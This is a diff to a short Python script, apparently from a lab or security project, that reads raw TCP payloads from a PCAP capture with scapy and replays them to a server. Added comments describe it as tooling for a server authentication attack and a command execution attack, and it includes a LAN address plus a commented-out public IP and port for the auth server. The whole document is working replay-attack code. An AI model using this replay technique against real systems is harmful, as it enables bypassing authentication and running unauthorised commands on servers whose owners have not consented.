@@ -1,15 +1,19 @@
+# Connection script for performing the server authentication attack and
+# same network command execution attack. This script establishes a TCP
+# connection with the server, sends data extracted from a PCAP file, and
+# displays the server's response.
+
 import socket
 from scapy.all import *
 
 
 def extract_data_from_pcap(pcap_file, connection):
-    # Read the PCAP file
+    # Read the pcap file
     packets = rdpcap(pcap_file)
 
-    # Extract data from the packets (modify this based on your needs)
+    # Extract data from the packets
     extracted_data = b''
     for packet in packets:
-        # Assuming the data is in the payload of TCP packets
         if TCP in packet and Raw in packet:
             send_and_receive_data(connection,bytes(packet[Raw].load))
 
@@ -17,8 +21,9 @@ def extract_data_from_pcap(pcap_file, connection):
 
 
 def establish_tcp_connection():
-    # IP address and port of the recipient "18.218.23.115", 16035
+    # Configure the correct IP and port combination
     ip_address = "192.168.12.234"
+    # Use the commented out versions to connect to the auth server
     # ip_address = "18.218.23.115"
     port = 8871
     # port= 16035
@@ -53,6 +58,7 @@ def send_and_receive_data(client_socket, data):
     return received_data
 
 if __name__ == "__main__":
+    # Select the correct pcap file for the data we want to send
     pcap_file = "captures/commands/newdirect.pcap"
     conn = establish_tcp_connection()
     extracted_data = extract_data_from_pcap(pcap_file, conn)
